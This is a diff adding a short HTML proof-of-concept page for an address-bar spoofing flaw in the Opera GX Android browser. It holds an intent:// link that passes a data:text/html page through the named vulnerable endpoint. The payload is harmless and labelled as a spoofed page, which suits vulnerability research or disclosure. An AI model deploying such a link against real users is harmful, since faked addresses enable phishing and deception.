@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opera GX Spoof PoC</title>
+</head>
+<body>
+    <h1>Opera GX Android Spoofing Test</h1>
+    <p>Click the link below to trigger the address bar spoof:</p>
+
+    <!-- 
+      The intent structure:
+      1. intent://vtp.operagx.gg/?url=  -> The vulnerable Opera GX endpoint.
+      2. data:text/html,...          -> The content to be displayed on the page.
+      3. #Intent;scheme=https;...    -> The intent parameters that target Opera GX.
+    -->
+    <a href="intent://vtp.operagx.gg/?url=data:text/html,<html><body><h1 style='color:red;'>This is a Spoofed Page</h1><p>The address bar above may show a different URL.</p></body></html>#Intent;scheme=https;category=android.intent.category.BROWSABLE;package=com.opera.gx;S.browser_fallback_url=https://www.opera.com;end;">
+        Click here to trigger PoC
+    </a>
+
+</body>
+</html>
